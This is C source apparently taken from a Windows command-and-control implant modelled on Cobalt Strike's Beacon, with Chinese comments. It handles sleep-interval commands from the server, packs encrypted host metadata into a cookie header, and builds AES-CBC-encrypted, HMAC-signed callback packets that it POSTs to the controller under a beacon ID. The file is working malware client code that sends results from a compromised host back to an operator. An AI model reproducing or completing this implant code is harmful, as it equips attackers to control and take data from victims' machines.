#define _TIMESPEC_DEFINED  // 防止 windows.h 重复定义 timespec
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "Command.h"
#include "Http.h"
#pragma warning(disable:4996)

extern int SleepTime;
extern int Counter;
extern unsigned char AESRandaeskey[16];
extern int clientID;

VOID CmdChangSleepTimes(unsigned char* commandBuf) {
    uint8_t buffer[4];
    memcpy(buffer, commandBuf, 4);
    uint32_t sleep = bigEndianUint32(buffer);
    SleepTime = sleep;
}

wchar_t* makeMetaData() {
    EncryMetadataResult EncryMetainfos = EncryMetadata();
    unsigned char* EncryMetainfo = EncryMetainfos.EncryMetadata;
    int EncryMetainfolen = EncryMetainfos.EncryMetadataLen;

    if (!EncryMetainfo || EncryMetainfolen <= 0) {
        fprintf(stderr, "EncryMetadata failed\n");
        return NULL;
    }

    unsigned char* baseEncodeMetadata = base64Encode(EncryMetainfo, EncryMetainfolen);
    free(EncryMetainfo);
    if (!baseEncodeMetadata) {
		fprintf(stderr, "base64Encode failed\n");
        return NULL;
    }

    size_t headers_length = strlen(metadata_header) + strlen(metadata_prepend);

    unsigned char* headerStart = (unsigned char*)malloc(headers_length + 1);
    if (!headerStart) {
        fprintf(stderr, "Memory allocation failed for headerStart\n");
        free(baseEncodeMetadata);
        return NULL;
    }

    memcpy(headerStart, metadata_header, strlen(metadata_header));
    memcpy(headerStart + strlen(metadata_header), metadata_prepend, strlen(metadata_prepend));
    headerStart[headers_length] = '\0';

    size_t cookieLen = strlen(headerStart) + strlen(baseEncodeMetadata);
    unsigned char* cookieStr = (unsigned char*)malloc(cookieLen + 1);
    if (!cookieStr) {
        fprintf(stderr, "Memory allocation failed for cookieStr\n");
        free(headerStart);
        free(baseEncodeMetadata);
        return NULL;
    }

    strcpy((char*)cookieStr, (char*)headerStart);
    strcat((char*)cookieStr, (char*)baseEncodeMetadata);

	free(headerStart);
	free(baseEncodeMetadata);

    // 转换为宽字符
    int wideLen = MultiByteToWideChar(CP_ACP, 0, (char*)cookieStr, -1, NULL, 0);
    if (wideLen == 0) {
        fprintf(stderr, "MultiByteToWideChar Failed With Error：%lu\n", GetLastError());
        free(cookieStr);
        return NULL;
    }

    // 多分配 3 wchar_t：\r, \n, \0
    wchar_t* wCookieStr = (wchar_t*)malloc((wideLen + 3) * sizeof(wchar_t));
    if (!wCookieStr) {
        fprintf(stderr, "Memory allocation failed for wCookieStr\n");
        free(cookieStr);
        return NULL;
    }

    if (MultiByteToWideChar(CP_ACP, 0, (char*)cookieStr, -1, wCookieStr, wideLen) == 0) {
        fprintf(stderr, "MultiByteToWideChar Failed With Error:%lu\n", GetLastError());
        free(cookieStr);
        free(wCookieStr);
        return NULL;
    }

    // 追加 CRLF
	// 自动在结尾添加 \0
    wcsncat(wCookieStr, L"\r\n", 2);

    free(cookieStr);

	return wCookieStr;
}

static BOOL append_data(unsigned char** buf, size_t* buf_length, size_t* buf_capacity, unsigned char* data, size_t dataLen) {
    if (*buf_length + dataLen > *buf_capacity) {
        // 扩容
        *buf_capacity = *buf_length + dataLen + 512; 
        unsigned char* new_buf = (unsigned char*)realloc(*buf, *buf_capacity);
        if (!new_buf) {
            fprintf(stderr, "realloc failed\n");
            free(*buf);
            *buf = NULL;
            return FALSE;
        }
        *buf = new_buf;
    }
    memcpy(*buf + *buf_length, data, dataLen);
    *buf_length += dataLen;
    return TRUE;
}

unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, size_t* msg_length) {
    Counter += 1;

    size_t buf_capacity = 1024; // 初始缓冲区容量
    size_t buf_length = 0;
    unsigned char* buf = (unsigned char*)malloc(buf_capacity);
    if (!buf) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    // 添加 Counter
    uint8_t counterBytes[4];
    PutUint32BigEndian(counterBytes, (uint32_t)Counter);
    if (!append_data(&buf, &buf_length, &buf_capacity, counterBytes, 4)) {
		fprintf(stderr, "append_data failed for counterBytes\n");
        return NULL;
    }

    // 添加结果长度
    if (postMsg) {
        uint8_t resultLenBytes[4];
        int resultLen = (int)msgLen + 4;
        PutUint32BigEndian(resultLenBytes, (uint32_t)resultLen);
        if (!append_data(&buf, &buf_length, &buf_capacity, resultLenBytes, 4)) {
            fprintf(stderr, "append_data failed for msgLen\n");
            free(buf);
			return NULL;
        }
    }

    // 添加 callback
    uint8_t callbackTypeBytes[4];
    PutUint32BigEndian(callbackTypeBytes, (uint32_t)callback);
    if (!append_data(&buf, &buf_length, &buf_capacity, callbackTypeBytes, 4)) {
		fprintf(stderr, "append_data failed for callbackTypeBytes\n");
        free(buf);
        return NULL;
    }

    // 添加 postMsg
    if (postMsg && msgLen > 0) {
        if (!append_data(&buf, &buf_length, &buf_capacity, postMsg, msgLen)) {
			fprintf(stderr, "append_data failed for postMsg\n");
            return NULL;
        }
    }

    // AES CBC 加密
    size_t decryptAES_CBCdatalen;
    unsigned char* EncryptAES_CBCdata = AesCBCEncrypt(buf, AESRandaeskey, buf_length, &decryptAES_CBCdatalen);
    free(buf);

    if (!EncryptAES_CBCdata) {
        fprintf(stderr, "AesCBCEncrypt failed\n");
        return NULL;
    }

    unsigned char* encrypted = EncryptAES_CBCdata + 16; // 存放HMAC Hash
    size_t encryptedBytesLen = decryptAES_CBCdatalen - 16;

    // 构建最终数据包
	// decryptAES_CBCdatalen(4Bytes) | encryptedBytes(decryptAES_CBCdatalen - 16 Bytes) | HMAC(16Bytes)
    int sendLength = decryptAES_CBCdatalen;
    size_t finalBufLen = 4 + encryptedBytesLen + 16;
    unsigned char* finalBuf = (unsigned char*)malloc(finalBufLen);
    if (!finalBuf) {
        fprintf(stderr, "Memory allocation failed\n");
        free(EncryptAES_CBCdata);
        return NULL;
    }

    uint8_t sendLenBigEndian[4];
    PutUint32BigEndian(sendLenBigEndian, (uint32_t)sendLength);
    memcpy(finalBuf, sendLenBigEndian, 4);
    memcpy(finalBuf + 4, encrypted, encryptedBytesLen);

    unsigned char* hmacResult = HMkey(encrypted, encryptedBytesLen);
    memcpy(finalBuf + 4 + encryptedBytesLen, hmacResult, 16);

    *msg_length = finalBufLen;

    free(hmacResult);
    free(EncryptAES_CBCdata);

    return finalBuf;
}

VOID DataProcess(unsigned char* postMsg, size_t msgLen, int callbackType) {
    unsigned char* BeaconIdHeader = makeBeaconIdHeader();
    unsigned char* dataString = makePostData(postMsg, msgLen, callbackType);
    size_t dataSize = strlen(dataString);

    wchar_t BeaconIdWideHeader[256];
    MultiByteToWideChar(CP_ACP, 0, BeaconIdHeader, -1, BeaconIdWideHeader, 256);

    POST(dataString, dataSize, BeaconIdWideHeader);
	free(dataString);
    free(BeaconIdHeader);
}